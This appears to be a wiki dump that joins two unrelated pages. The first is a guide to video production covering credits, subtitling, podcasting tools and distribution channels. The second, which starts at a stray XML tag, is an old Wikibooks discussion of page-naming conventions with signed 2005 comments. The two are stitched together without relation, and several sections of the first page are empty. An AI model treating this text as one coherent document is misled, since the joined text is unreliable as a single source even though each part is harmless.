In some cases, all contributors can be credited in a single still frame near the beginning or end of a video. This method is simple but impractical for videos with a large number of contributors.

;Marquee method
The marquee method consists of one or more streams of scrolling text, typically oriented vertically or horizontally. For aesthetic purposes or to create a focal point, text is sometimes faded with a gradient. This method is commonplace in many videos.

;Serial method
The serial method describes text where contributors are credited individually. This method can sometimes be manipulated for effect when carefully synchronized with audio that is complementary or suspenseful.

======Backgrounds======
;Static
Static backgrounds, a common example being solid black, are simple and can provide high contrast for viewers.

;Hybrid
When possible, a static background can be framed in graphics, animations, or video.

;Uninterrupted content
In many cases, credits can overlay uninterrupted video without any issue. This may be desirable or undesirable depending on the video and intended audience.

;Tailored scenes
Production value can often be greatly enhanced by the integration of video that is purposefully tailored for displaying credits. For example, if introductory credits are desired and a video's first scene portrays political proceedings, text could overlay video of the legislative building followed by a person walking up its steps to the doors. 

======Placement======
Credit placement can play an important role in its accessibility, the ability to provide context, and even a video's overall production value. Typically, credits are placed near the beginning and/or end of a video, but they can also be interspersed. In some cases, the visibility of credits—especially those at the end of a video—may be diminished by a broadcaster's proclivities, such as the use of picture-in-picture to introduce subsequent programs or sometimes even outright omission. 

;Opening credits
Credits can be placed at the beginning of a video. Often, this is done to highlight leading contributors while other contributors are listed in closing credits.

;Closing credits
Credits can be placed at the end of a video. This placement is often used for comprehensive attribution.

;Realtime attribution
The realtime model is often preferred in cases where communicating context to the viewer in real-time is a top priority. This method is frequently accompanied by one or more others and is typical of journalistic productions.

Some videos also use realtime attribution as a humorous [[w:Gimmick|gimmick]] or to suggest irony.

======Styles======
;Staging method
The staging method entails a series of static frames, each crediting a given number of contributor. When used as part of an introductory phase, this method allows for leading contributors to be featured and can also be used to incorporate visual elements that affect the viewer's perception of succeeding content. For example, these visual elements might include key characters, allusive symbols, enthralling objects, or immersive scenes with each new interval of progression.

;Interspersed method
The interspersed method employs gradual crediting of contributors in phases spanning a prolonged introductory period or sometimes even an entire video. This method may be used for effect, such as to tantalize or surprise, or to add artistic value. Contributors may be credited along with the introduction of a relevant character, scene, theme, or plot. In many cases, this method is best combined with one or more others.

====Metadata====
Metadata can facilitate the attribution of contributors in some digital formats.

=====MP4=====
MPEG-4 supports the ISO-standardized [[w:Extensible Metadata Platform|Extensible Metadata Platform]] in addition to its own metadata format.

====Resources====
*[http://www.ElectricHappiness.com VideoTagger] - A proprietary tool for creating credits on Windows and Mac. Free version available.

===Intermission===
[[File:Content intermission.svg|thumb|right|300px|An intermission screen]]
Intermission is sometimes desired, or even in the case of videos produced live, a necessity.

===Length===
Video length is often an important consideration.

====Palatability====
{{expand|section}}

====Limitations====
Some distribution platforms platforms are designed to accommodate videos of a specific length. For instance, a television station may have program blocks of 15 and 30 minutes, while an online hosting provider may allow for hours or even seconds, in the case of a Vine.

Limitations may become a cross-consideration in the event that a video has enough potential to be desired in its original form on an alternate format, which is something to evaluate in certain circumstances.

===Live broadcasts and streams===
[[File:Content introduction.svg|thumb|right|300px|Introductory screens inform viewers that content will begin soon]]
Productions that utilize live video present unique considerations.

=== Transcription ===
Subtitles and transcripts are different: a transcript is only the text of the video, whereas a subtitle file includes the timecode as well. Subtitle files have a variety of formats (.srt, .sub, etc.), but they are compatible with each other.

====Subtitles====
It is very important for independent video producers to make available subtitle files (or at least transcripts) when they are distributing their work. Furthermore, it is highly beneficial for online video distribution projects to include an option to upload subtitles/transcripts with the video files, even as a way to raise awareness on the issue. Without a subtitle file in the original language, it is much much more difficult to translate a video, which highly limits the possibility of its distribution.

=====Preparation=====

=====Formatting=====

=====Translation=====
======Workflow======
This is a suggested workflow that would make translation of your video or DVD much easier. It avoids the problem caused by networking transcriptions of video features without the time code, which is that each transcript then has to be timecoded for each language. With co-ordination we should be able to avoid this. There is a project and sample workflow for subtitling [http://www.network23.org.uk/node/79 here]. This also includes a suggested [[/Workflow for translators helping video collectives with subtitle translations]]. Work that needs to be done: building a network of translators familiar with the use of subtitling software that can read, edit and create *.srt subtitle files.

====Resources====
This section includes transcription, subtitling, and translation tools.

=====Projects=====
*[http://www.dotsub.com/ DotSub] - Any Film Any Language: a set of unique browser tools for subtitling film from one language into any other language
a catalogue of films subtitled into multiple languages using our tools.
*[http://www.streetparty.sk/subtitles/ Documentary Videos] - A web page which makes available Transcripts and subtitles for indymedia type videos.
*[http://video.omweb.org/ Sub Video] - a collaborative resource for international video accessibility and exchange.
*[http://translations.indymedia.org/ Indymedia Translations Project]  Only text, volunteer-based, with workflow management.
*[http://www.babels.org Babels Translation Collective] They currently have a section on their forum for translation outside of the Babels network http://www.babels.org/forum/viewforum.php?f=35. It may be desirable for video collectives to build a more structured dialogue with babels translators including a workflow including subtitle files.

=====Cross-platform software=====
*[[/Editing a subtitle file with a text editor/]]:
*[[/Creating a multi-lingual matroska file/]] which uses http://www.bunkus.org/videotools/mkvtoolnix/

==Publication==
===Advertisement===
{{expand|section}}

====Physical====
[[File:Poster - In Old Chicago 05.jpg|thumb|right|300px|Posters are one form of advertisement that can be used to solicit prospective viewers.]]
Printed posters, billboards, and sidewalk signs can all be used to advertise a video.

====Trailers====
[[File:Will Success Spoil Rock Hunter trailer.ogv|thumb|right|300px|This trailer entices the viewer by introducing characters.]]
Trailers are short clips that solicit further interest in a full video.

===Formats===
====DVD====
=====Windows=====

===Licensing===
====Restrictive====
{{expand|section}}

====Permissive====
[[File:Creative Commons - Building On The Past.ogv|thumb|right|300px|This video can be redistributed without legal complications because it was published under a [[w:Creative Commons license|Creative Commons license]]]]

If a video is released under a permissive license, such as the [[w:Creative Commons license|Creative Commons attribution license]] (CC-BY), others can exhibit and redistribute the video without difficulty.

====Public Domain====
{{expand|section}}

===Encoding===
{{Main|Video Production/Encoding}}
Because raw video files are tremendously large by contemporary standards—an uncompressed half-hour 1920x1080 8-bit video at 30 frames per second will exceed 300 GB, for example—it is generally necessary to make use of a process known as encoding. The same 300GB video, when encoded with a common codec, will be reduced to about 20 GB.

There are a few popular ways of encoding video using commercial solutions and many free options exist as well.

====Codecs====
Codecs are software algorithms that compress data into a desired container format. 

Many codecs exist and in order to select the one most suitable, several factors may need to be considered, including availability, video quality, compression efficiency, compatibility with the intended method of distribution, and licensing.

====Introduction to using Open Source Tools for Video Production and distribution====

Different Software is used for the many stages of the Video production process. Depending on what platform you use there are various different levels of effectiveness and ease of use of the open source solutions.

This is a section of notes on interpretations of the scope and ease of use of different Free and Proprietary software. 

[[/Mick Fuzz's notes on Windows &amp; Mac platforms and Free Software solutions/]]

==== Working out what kind of Video File you have ====

If you are uploading a video file and you often need to know what type/ codec it is to allow people to be able to make the correct choice to download it.   

Here is a quick guide to working out that information

If you have windows you can use a program called gspot
Guide to Using gspot - http://www.headbands.com/gspot/v26x/quick_start.html

Or you can have a look at this quick guide below

====How to Make a Video podcast====

What is a podcast?

Why create one?
Video podcasts are a good way to distribute your Video. They can be seen in programs like iTunes, Democracy player and Fireant. If you get the format of you video file right they can also be downloaded onto portable devices. They can also be featured on other people's websites often as a list at the side of their pages. This is called syndication.

What do you need to do to make one?

Get you audio or video ready for the Internet. 
(see encoding notes)

Essentially you have to make specialised a text file available on your website. This file is written in a simple Markup language  which gives details about your video. It part of it might look a bit like this. 

&lt;tag&gt;&lt;/tag&gt; 

You can if you choose hand code this file, but there are automated ways which make it a bit easier. This next section examines the different solutions. 

=====Using Blogger and Feed burner and Archive.org=====

Once you have created your audio / video files, you can use these 3 free tools to create podcasts.

======Step one: put your media up online with archive.org / ftp to a webspace======

To do this you first need to sign up to be an archive.org member. Go to the front page, click join us, and follow the instructions. 

You can then download a free tool called ccpublisher. 
http://wiki.creativecommons.org/CcPublisher (pc, linux, mac)

With this tool you can upload your music / video file to the archive.org site, and choose a copyright licence to go with it. You will then get a page where the link to your file is displayed.

Or if you have some webspace that you can upload your files to. Use an FTP client to do this. See help for how to do this with Smart ftp here, http://www.clearerchannel.org/clearertraining/ftp/ftp.html

======blogger.com======

You can create a blog quickly and easily at blogger.com - A blog is a simple web page which is diary like in format listing the latest posting first (just like a podcast does).  

In the settings panel of blogger.com you can adjust the formatting tab so that you can include a link with every post. In the link field we need to paste a link to the uploaded media file on achive.org.

======feedburner.com======

blogger.com creates an RSS feed for all your entries, but it is not a Podcast. You can't use a program like iTunes with it yet. We need to use a service called feedburner to change the feed into a Podcast. 

To do this we need to click an option on the feedburner settings called smartcast. 

Overview http://blog.forret.com/2004/10/how-to-podcast-with-blogger-and-smartcast/

=====Using a  Video Content Management system=====

======Ourvideo CMS - (not a big community  of developers)======

Ourvideo CMS is a Media content management system running on MySql and php. It is aimed at community and low budget groups and can help them achieve their aims at a lower cost in the following ways. There are minimal changes to the standard server environment to help groups that don't have access to a high level server administration resources.

http://ourvideocms.sourceforge.net/

Demo site http://www.clearerchannel.org

======Loud Blog website======

Loudblog is a flexible and easy-to-use Content Management System (CMS) for publishing media content on the web. It automatically generates a website and multimedia distribution via Podcasting.

Loudblog needs to be installed on a webserver and requires systems administrator level skills for install and setup. It will allow you to host your own website with integrated audio and video distribution support. 

You can upload your audio/video via ftp, via web forms, by fetching external links - thus hosting them on your server, or linking to external files.

It is designed for audio, and creates a flash audio preview. This is also possible with some video files. So the web presentation of your media is pretty good. It takes the form of a blog.  

It creates a podcast with iTunes categories. 
http://loudblog.de/

Disadvantages: 
* This is set up for audio files, so while the podcasts do work for video files, you get unsuitable messages on the wen pages, like &quot;listen now&quot;
* The RSS podcast doesn't have images associated with it yet. It has no &quot;media:thumbnail&quot; element in the feed.

======Word Press CMS======

The wordpress content management system has a very simple approach to podcasting. 

How It Works

* Create audio or video that you want to share (usually MP3 or MP4)
* Upload the file to a server
* Link to the file in a post in your weblog
* Wordpress automatically Includes a link to the file in your RSS/Atom feed
* Listeners &quot;subscribe&quot; with podcast client application to your RSS/Atom feed and download new files automatically. 

WordPress creates all the necessary links for you! 

Disadvantages:
Archive.org can be used to host podcast audio files but archive.org uses re-directs on the file paths it publishes - this confuses WordPress, and consequently, the Podcast publication fails (missing enclosure tag error).

To avoid this error, if you are hosting your audio files on archive.org, you need to add a Custom Field called &quot;enclosure&quot; and paste the full URL for the mp3 file in the Value field. 

more info
http://codex.wordpress.org/Podcasting

There is also a more advanced podcasting options.

=====Rss editor for Windows=====

If you don't want to enter details in to a Content Management system, or don't have the technology to set one up. Then there is an alternative. If you have ftp access to your website. You can enter the details of each podcast item into a program called rss editor and it will alter and upload the RSS file you need to have a podcast. There is tutorial below. 

http://www.rss-info.com/en_rsseditor.html

Tutorial &gt;&gt; [[/Rss editor for win/]]

=====Notes on Media RSS / Podcasting specifications=====
Unfortunately the Media RSS specification used by Democracy player and Yahoo isn't the same as the Podcasting specification used by iTunes. The solution is to avoid things that will make your feed unreadable in either.  

Here is a summary of how they are different. 
http://www.tnl.net/blog/2005/06/29/rss-and-media-cant-we-all-just-get-along/

==Distribution==
For issues that are not covered in the corporate media, using a network of community screenings, independent cinemas and pirate TV is a good way to get your media, such as a film or documentary, out there.

=====Appropriate Use of Video released over the Internet=====

[[/Appropriate use/]]

Some thoughts on specifying the appropriate/ethical uses of online video.

=====Content Management Systems and related tools for Video on the Net=====

Plone is one system that can be used, Engage Media are working with other plone developers on multimedia aspects of this set of tools. 
A sample site for this is Engage Media http://www.engagemedia.org/

Drupal is another popular content management system (CMS) that can be used to manage your video online. 
An example of a site that uses Drupal to manage video is Ourmedia, although the code to that doesn't seem to be published, see http://drupal.org/node/19904

Some work has been done on aggregation sites which really maximises the capacity of Drupal to import and manage RSS or RDF data. 

One example of this is the V2V site which outputs data in RDF form which can then be imported into a CMS. [http://v2v.cc/development v2v software page]

=====Media RSS or specialised RDF to share content=====

It should also be possible in such an aggregation site to search the contents and the keywords of distributed content by searching the contents of their RSS feeds or RDF feeds if the information required isn't contained in the RSS feed. Would a new search tool have to be written or is there one in existence? 

Media RSS is a very useful tool for more than the use mentioned above. [http://en.wikipedia.org/wiki/Media_RSS Wikipedia Media Rss entry]

The media RSS specification is here http://search.yahoo.com/mrss
and the yahoo group for discussion is here http://groups.yahoo.com/group/rss-media/

One question that came up at the Transmission 2006 gathering, 
Is Media RSS with its category and keyword section enough to create a shared search tool for distributed content? If so how should we collaborate on standard categories and keywords?

One idea which was posted to the Media RSS yahoogroup: If Media RSS included a &quot;group&quot; tag, then partners could tag this with a shared discreet tag like &quot;transmission&quot; and search capacities could pick up only entries tagged as transmission. 

* Asia 247 use iTunes categories which are right at the bottom of this page http://www.apple.com/itunes/podcasts/techspecs.html
* One World TV uses categories/keywords set in an RDF dataset called [http://soma-dev.sourceforge.net SOMA]
* There is also a very basic yahoo category set used in the Media RSS specifications http://search.yahoo.com/mrss/category_schema on this page the invite people to get involved and add more. There is a fairly flexible keyword tag used too.

===Television===
====Terrestrial Broadcast====
{{expand|section}}

=====Pirate TV=====

====Cable====

====Satellite====
=====United States=====
======Free Speech TV (FSTV)======
It is possible to submit Social Justice video content to [[w:Free Speech TV|Free Speech TV]] which covers every state in the US. One very successful use of FSTV is Deep Dish TV, a New York based part of the network which collates the work of Independent Video producers and grass roots activists and puts together professional shows which are uplinked to FSTV. They are also recorded locally and retransmitted by over 200 local TV stations and cinema/community screeners. In this way the costs and time of copying and networking physical tapes and disks are reduced. 

FSTV also accept content from outside the USA, for example programmes from UK based [http://www.undercurrents.org Undercurrents Productions] and the [http://europeannewsreal.indymedia.org European Newsreal]

=====Europe=====
In Europe it is possible to rent the time of satellites without paying for them all the time. This may be useful to network programmes for retransmission to local TV stations and collectives. One company that does this is listed below:

:Figen KAPLAN
:Bilge Uplink Services
:Istanbul / TURKEY
:Tel: +90 216 335 32 62
:Fax: +90 216 329 02 99

===Physical media===
Optical media, such as DVDs and Blu-ray discs, is commonly used in much of the world to physically distribute content. USB drives can also be used.

      <text xml:space="preserve">{{obsolete|WB:HNS|superseded=Wikibooks:Naming policy}}

Books on Wikibooks should be structured in to sections (akin to chapters), in a manner at the discretion of the authors of the Wikibook. However, there is no one method of denoting substructure within Wikibook article names. This page is to discuss the merits of the currently used methods and to decide on a method to use, which will then become a definite recommendation to future books on [[Wikibooks:Naming conventions]].

There are several issues involved in the naming convention, and it is the cleanest to discuss them separately (for example, which delimiter (&quot;:&quot;, &quot;/&quot;, &quot;(..)&quot;,..) to use is more or less independent of the question whether to allow several levels of hierarchy or whether numbers should be used for labelling chapters). Each section states current examples.

Please add to advantages or disadvantages below, or provide discussion alternatives.

== Delimiters ==
=== Subpages &quot;/&quot; ===
One method is to use subpages, that is, for a Wikibook named ''bookname'', and a subpage called ''subpagename'', the article name is &lt;tt&gt;bookname/subpagename&lt;/tt&gt;. 
 [[Wikijunior Solar System]]
 [[Wikijunior Solar System/Mars]]
 [[Wikijunior Solar System/Glossary]]

Advantages:
* The main merit to this scheme is that it allows for automatic navigation links within the hierarchy.
* This allows hierarchy but also allows sub-subhierarchy and more.
* Every sub(sub..)page gets a &lt;!-- &quot;link (inflexible though)&quot; replaced by the more neutral &quot;static link&quot; --&gt; static link to all its parents. One can reference to subpages with &lt;nowiki&gt;[[/subpagename]]&lt;/nowiki&gt; (i.e. bookname is not necessary).
* It will appear similar to directories in the URL as pointed out 1 1/2 years ago [http://mail.wikipedia.org/pipermail/textbook-l/2003-July/000102.html] and in that sense also follows in principle the [[wikipedia:principle of least surprise|principle of least surprise]].

Disadvantages:
* The main demerit is that the scheme facilitates the use of subhierarchies, which may make the book slightly more difficult to read or present. Also, authors might be tempted to over-use the tree-structure. It might therefore be part of the recommendation, to use only one level of subpages, and a second only if needed in very large books (see separate discussion point below).
* Links from one subpage to another subpage must be typed in full.  Further, the pipe trick does not work for subpages; &lt;nowiki&gt;[[Bookname/Subpagename|]]&lt;/nowiki&gt; displays as [[Bookname/Subpagename|Bookname/Subpagename]]
* All links to subpages are case sensitive; [[Wikijunior Solar System/The Sun]] vs [[Wikijunior Solar System/the Sun]]
* The delimiter &quot;/&quot; will interfere with the filesystem when one wants to save files and automatically process them by scripts and simple UNIX commands like grep. It would be required to use &lt;!-- &quot;get painfully awkward help from&quot; --&gt; &lt;!-- other UNIX commands --&gt; additional commands like &quot;mkdir&quot;, &quot;find&quot;, and &quot;xargs&quot;.
* The enforced tree structure is unsuitable for many uses. For example: anise is a spice, herb, and vegetable. There is no correct way to set this up such that automatic links will be provided for all uses of anise. One would have to choose more general tree nodes, like &quot;glossary/anise&quot; or a completely flat structure (&quot;cookbook/anise&quot;).

=== Real custom namespaces ===
One method is to use [[m:Help:Namespace#Custom namespaces|custom namespaces]], that is, for a Wikibook named ''bookname'', and a subpage called ''subpagename'', the article name is &lt;tt&gt;bookname:subpagename&lt;/tt&gt;. Examples:
*[[Cookbook]]
*[[Cookbook:Grilled Cheese Sandwich]]
*[[Cookbook:Contributors]]

Advantages:
* This scheme is like other namespaces, and as such, follows the [[wikipedia:principle of least surprise|principle of least surprise]]. 
* Linking becomes simple using the pipe trick; &lt;nowiki&gt;[[Bookname:subpagename|]]&lt;/nowiki&gt; becomes [[Bookname:subpagename|subpagename]].
*[[Special:Allpages]] can be applied to a book of choice.
*[[m:Help:User contributions|User contributions]] can show all, or be restricted to a book of choice.
*From MediaWiki 1.5 [[m:Help:Recent changes|Recent changes]] ditto; for this, Allpages and User contributions, one can also select all namespaces except a specified one; thus, one can still have a combined list including all book pages by selecting e.g. the image namespace and using the invert option.
*[[m:Help:Searching|Searching]] can be restricted to any subset of books.
*The variables &lt;nowiki&gt;{{NAMESPACE}} and {{PAGENAME}}&lt;/nowiki&gt; give the book name and the page name without book name, respectively.

Disadvantages:
* Creation, deletion, and renaming of a custom namespace can only be done by a developer (when a new book is started, provisionally a pseudo-namespace can be used, see the next section).
* The maximum number of &quot;real&quot; namespaces is limited by the software to 256 (it is a TINYINT(2) in the SQL database), i.e. numbers 0-255. Custom namespace numbers start with 100, so there can be 156 of them, including talk pages, i.e. 78 custom namespaces and their talk namespaces. However, from MediaWiki 1.5 the maximum is 65,536, i.e. 32,718 custom namespaces and their talk namespaces, see [[Bugzilla:719]].

=== Pseudo-namespaces ===
Another method is to mirror that of namespaces, that is, for a Wikibook named ''bookname'', and a subpage called ''subpagename'', the article name is &lt;tt&gt;bookname:subpagename&lt;/tt&gt;, like above. 

Advantages:
* The main merit to this scheme is that it is mirrored in namespaces, and as such, follows the [[wikipedia:principle of least surprise|principle of least surprise]]. 

Disadvantages:
* The main demerit is that this scheme doesn't act as a namespace, but merely looks like one .
* With pseudo-namespaces, the pipe trick still works, but the first letter of the subpage name is case sensitive, which makes them less useful for inline links.

=== Brackets &quot;(..)&quot;===
One method is to use brackets, that is, for a Wikibook named ''bookname'', and a subpage called ''subpagename'', the article name is &lt;tt&gt;subpagename (bookname)&lt;/tt&gt;. 
 [[General Biology]]
 [[Energy and Metabolism (General Biology)]]
 [[Authors (General Biology)]]

Advantages:
* Similar to Wikipedia's [[Wikipedia:Disambiguation|disambiguation]], people coming from Wikipedia will be familiar with this.
*This allows for easier linking, using the pipe trick; &lt;nowiki&gt;[[subpagename (bookname)|]]&lt;/nowiki&gt; appears as [[subpagename]]. 
Disadvantages:
* More difficult to extract a list of books automatically in the future (see [[Wikibooks:Top active/All books]]). In an automatic extraction it is more difficult to tell apart a book title from the middle of a string, because it might be part of another subpage title. The extraction process is unique, if the bookname always appears on the front position.

=== No delimiter, no book title on subpages, all in wikibooks.org domain ===
One method is to use no delimiter at all, that is, for a Wikibook named ''bookname'', and a subpage called ''subpagename'', the article name is &lt;tt&gt;subpagename&lt;/tt&gt; (i.e. the bookname does not appear).

 [[World History]]
 [[Civilization and Empires in the Indian Subcontinent]]  (&lt;- this is a subpage of World History!)
 [[The Industrial Revolution]]    (&lt;- this is a subpage of World History!)
&lt;small&gt;([[World History]] pages have been changed in the meantime to namespace delimiter. The lines are kept as an example)&lt;/small&gt;
 [[Vector Math]] (&lt;- this single modules is referred to in the middle of the Geometry, Calculus, and Electronics books)
 [[ASCII character set]] (&lt;- this single module is referred to in the appendix of just about every programming language)

'''Advantages:'''
* Title of subpages does not get cluttered by long book title.
* Normal wiki ease-of-use is fully restored: &lt;nowiki&gt;[[foo]]&lt;/nowiki&gt; instead of &lt;nowiki&gt;[[Bookname:Foo|foo]]&lt;/nowiki&gt;.
* Short modules that are part of several different wikibooks can be written once and for all. After improving that module in the course of editing one book, all the other books immediately use the improved version.
* This doesn't require a seperate database or software change -- it's already running at http://wikibooks.org/ .

'''Disadvantages:'''
* Without separate domain names or software changes (which are unlikely to happen soon) chapter pages are very likely to run soon into naming conflicts between books.

Note that '''both of the disadvantages''' may '''not''' be relevant for certain [[Wikibooks:Annotated texts|annotated texts]]. I.e. for specific texts with unique titles, which will be annotated only once, there are no naming conflicts. Therefore, no subdomains are required, nor any software changes, and normal wiki ease-of-use is fully maintained.
: I think you mix up &quot;no delimiter, no book title on subpages&quot; with the next section &quot;arbitrary delimiter&quot;, that is a blank space &quot; &quot;, or a section that still would have to be added. &quot;No delimiter, no book title on subpages&quot; means here that the bookname does '''not''' appear on every subpage, which makes it very likely that two books get into naming conflicts, even for annotated texts.

=== No delimiter, no book title on subpages, and separate domain names ===
One method is to use no delimiter at all, that is, for a Wikibook named ''bookname'', and a subpage called ''subpagename'', the article name is &lt;tt&gt;subpagename&lt;/tt&gt; (i.e. the bookname does not appear).
Also, each book is placed in a separate domain name.
 [[World History]]
 [[Civilization and Empires in the Indian Subcontinent]]  (&lt;- this is a subpage of World History!)
 [[The Industrial Revolution]]    (&lt;- this is a subpage of World History!)
&lt;small&gt;([[World History]] pages have been changed in the meantime to namespace delimiter. The lines are kept as an example)&lt;/small&gt;
 [[Vector Math]] (&lt;- this single modules is referred to in the middle of the Geometry, Calculus, and Electronics books)
 [[ASCII character set]] (&lt;- this single module is referred to in the appendix of just about every programming language)

'''Advantages:'''
* Title of subpages does not get cluttered by long book title (but the book title is put in the domain name).
* Scalable, making it easier to split up wikibooks over more servers.
* No unrelated clutter in [[Special:Recentchanges]], [[Special:Allpages]], [[Special:Wantedpages]], [[Special:Lonelypages]], [[Special:Deadendpages]], and [[Special:Categories]]. '''(Yes! We need this!)'''
* Normal wiki ease-of-use is fully restored: &lt;nowiki&gt;[[foo]]&lt;/nowiki&gt; instead of &lt;nowiki&gt;[[Bookname:Foo|foo]]&lt;/nowiki&gt;.
* This doesn't require a seperate database or software change -- it's already running at http://wikicities.com/ .

'''Disadvantages:'''
* This requires separate domain names: cookbook.wikibooks.org
* A module cannot be shared between books -- the [[Vector Math]] module is custom to each book it appears in. If 10 different people make 10 different improvements to that module, those improvements are scattered over all the copies of that module, and it is hard to integrate them.

=== Arbitrary delimiter ===
Any character could be used as a delimiter, restricted only by the taste and imagination of the authors: &quot; &quot; (blank space), &quot;-&quot;, &quot;--&quot;, &quot;,&quot; (comma), &quot;;&quot;, .... All of these in combination with another blank &quot; &quot; (white space) either before, or after the delimiter, or both.
 [[As You Like It]]    &amp;rArr;  [[As You Like It - Act III]]
 [[Bicycle Repair]]    &amp;rArr;  [[Bicycle Repair Cleaning parts]]
 [[Using GNOME]]       &amp;rArr;  [[Using GNOME : File manager]]
Advantages:
* Each author can easily please their tastes.

Disadvantages:
* It is difficult to work efficiently upon different books without a clear convention.
* It is not consistent across books.
** Thus, it becomes a usability problem.

=== A combination ===
Use a combination of the above: For example place books into a designated namespace, but place pages on subpages.
 [[Musictionary]]
 [[Musictionary:Guitar]]
 [[Musictionary:Guitar/Bass]]

Advantages:
* Could combine the advantages of namespaces (if they were really activated) and of subpages (link to parent).

Disadvantages:
* Makes very long titles for subpages.
* For new users this approach does not seem intuitive and simple at all. Since two different delimiters are used, it might be cause of confusion or false usage.

=== Other ===
'' Please place other methods here ''

== Subhierarchy ==
=== As flat as possible ===
The naming of subpages should be done so that each subpage name reflects hierachy, but does not introduce sub-subpage level of hierachy. This should be done so that the ''subpagename'' together with the ''articlename'' sounds as natural as possible.
 [[US History]]
 [[US History:Pre-Columbian]]
 [[US History:Civil War]]

Advantages:
* Chapters can be easily rearranged in the future. The emphasis is on the content of the subpage, not its structural location within the book.

Disadvantages:
* The structure of the book is not visible from the title. One needs to refer to the table of contents, or other navigational help.

=== As structured as possible ===
A book could be structured in several chapters, sections, sub-section, and so on. Subpages allow easily to build this kind of hierarchy, but one is not limited to the use of subpages: With any kind of delimiter, a structuring is possible. For namespace-like delimiters, it is possible by adding extra :''subpagename'' sections, but this method is ''not'' mirrored in namespaces.
 [[Geometry]]
 [[US History]]
 [[US History:Pre-Columbian]]
 [[US History:Pre-Columbian:Aztec Empire]]
 [[US History:Pre-Columbian:Mayan Empire]]

Advantages:
* Book structure is easily visible: One &quot;knows&quot; in which part of the book one is.

Disadvantages:
* The main demerit is that subhierachies may make a book slightly more difficult to read or present.
* Another disadvantage is that it doesn't allow for a page to be in more than one location in the hiearchy of non-linear wikibooks.  For example, [[Cookbook:San Francisco style Scallop Ceviche]] is a ceviche recipe, a main dish, an appetizer, a scallop recipe, and a California cuisine recipe, and could be structured under any of these. [[User:Gentgeen|Gentgeen]] 22:12, 13 Mar 2005 (UTC)

== Title on subpages ==
=== Use the full book name on subpages ===
A ''bookname'' scheme can be to use the same ''articlename'' on the contents and the book pages proper, ie ''bookname'' is the contents page and ''bookname'':''subpagename'' are on the subpages.
 [[SA NC Doing Investigations]]              &amp;lArr; bookname
 [[SA NC Doing Investigations:Chapter 1]]
 [[SA NC Doing Investigations:Chapter 2]]    &amp;lArr; same bookname

Advantages:
* One (reader and automatic software) can easily see which subpage belongs to which book.
* Given the name of any subpage, I know the name of the book. 

Disadvantages:
* Subpage heading might get very long.

=== Use a short book name on subpages ===
Another possibility is to use a long elaborate title for the book name, but a shorter title for the subpages, i.e. using a long ''bookname'' on the contents and a shorter ''shortbookname'' on the subpages. The shorter title should not be reduced to have the effect to reduce readability - for example, &quot;IP:...&quot; should not be used as a short title of &quot;Introduction to Philosophy&quot;; one reason why this is a bad idea is because it can be confused with a title such as &quot;Inside Perl&quot;?

 [[Learning the vi editor]]                 &amp;lArr; bookname
 [[Learning vi:Basic tasks]]
 [[Learning vi:Advanced tasks]]             &amp;lArr; shorter bookname

Advantages:
* The long title can be more descriptive, without cluttering all sections of a book.

Disadvantages:
* Makes automatic extraction of book information more difficult.
* Subpages only work when the exact title is used on every subpage.

== Numbers as chapters ==
=== Use chapter descriptions ===
 [[Business English/Getting more practice]]
 [[Business English/Phrasal verbs]]
 [[Business English/Phrasal verbs/Get]]

Advantages:
* One knows about the content of the chapter.
* It is easy to insert new chapters between existing ones or change their order (important for the wiki process!)
* Chapters can be easily rearranged in the future. The emphasis is on the content of the subpage, not its structural location within the book.

Disadvantages:
* One does not know about the current position within the book =&gt; need for additional navigational structure.

=== Use chapter numbers ===
 [[Computer Science:Algorithms:Chapter 1]]
 [[Computer Science:Algorithms:Chapter 2]]
 [[Computer Science:Algorithms:Chapter 3]]

Advantages:
* The structure of the book is emphasized.

Disadvantages:
* The number does not say anything about the content of the chapter.
* It is difficult to rearrange chapters or insert a new chapter between existing ones (move all higher books, or copy all content?). This is insofar severe, as wikibooks are expected to grow in the future.
* It is completely unusable in non-linear wikibooks.

=== Use chapter numbers and description ===
 [[Macbeth - Act 5, Scene 1 - Dunsinane. Ante-room in the castle]]
 [[Macbeth - Act 5, Scene 2 - The country near Dunsinane]]
 [[Macbeth - Act 5, Scene 3 - Dunsinane. A room in the castle]]

Advantages:
* One knows in which part of the book one is.

Disadvantages:
* Difficult to insert new chapters.
* Long titles.

== Personal taste and discussion ==
''Please place advantages and disadvantages of the methods in the appropriate sections above, and put personal taste into here.''

I think, with all the mess around currently, the definite way for the future is to have a '''clear recommendation''' for future books (which hopefully will outnumber the existing books at some point in the future), whichever that might be.
Since subpages offer an automatic link to the parent page and (more or less) force to use exactly the same booktitle on all subpages of the book, my personal taste would be to promote subpages as the way to go, clearly recommending only 1 layer of substructure (no sub-subpages), and descriptions of chapters instead of numbers. --[[User:Andreas Ipp|Andreas]] 09:37, 13 Mar 2005 (UTC)

: The result of the below vote should not result in a mere recommendation - it should be ''policy''. I have no real problems with subpages other than the hierachy and the principle of least surprise comment that the &quot;:&quot; has that I've raised before. [[User:Dysprosia|Dysprosia]] 10:36, 13 Mar 2005 (UTC)

::My thoughts are at [[Help:Pages#Namespaces|Help:Namespaces]].  I don't find either of the namespace cons very persuasive -- we can use more than 200 namespaces right now, and the software could surely be changed to allow for me (is there a technical reason it has to be at any fixed number?). [[User:TUF-KAT|TUF-KAT]] 21:49, 13 Mar 2005 (UTC)

::: Apart from the 15 standard namespaces, none of the additional namespaces listed on [[Help:Pages#Namespaces|Help:Namespaces]] is actually really a namespace (Cookbook is none, Wikiversity is none... I know this because I restricted my [[Wikibooks:Top active]] SQL search to namespace &quot;0&quot;, and Cookbook and Wikiversity are both in there - my list of books counts 400 titles by the way). I cite from [[Wikibooks talk:Namespaces#Policy on namespaces]]:
:::: ''&quot;With the current implementation, having too many custom namespaces is a bad idea - they all have to be manually entered in the MediaWiki configuration file. Also, deleting and renaming namespaces is quite a pain. So I suggest keeping the number of custom namespaces small, at least at first, maybe 5 or 6.--Eloquence&quot;'' [http://en.wikibooks.org/wiki/Wikibooks_talk:Namespaces#Policy_on_namespaces]
::: So we are really talking about &quot;pseudo&quot;-namespaces, that only ''look'' like namespaces but are not really (still, the pipe-trick works for them too: &lt;nowiki&gt;[[book:page|]] will display as [[page]]&lt;/nowiki&gt;). Given that, it is just a matter of taste which symbol to use to delimit the bookname from the subpage name. The only true hierarchical support is given for subpages, which give an automatic link to the parent page. This option was not available when things were discussed on [[Help:Pages#Namespaces|Help:Namespaces]] (since subpages have been enabled only recently for the main namespace on Wikibooks), but is available now, and might help the many new wikibooks that pop up every week by providing the basic navigation &quot;for free&quot;. --[[User:Andreas Ipp|Andreas]] 23:35, 13 Mar 2005 (UTC)

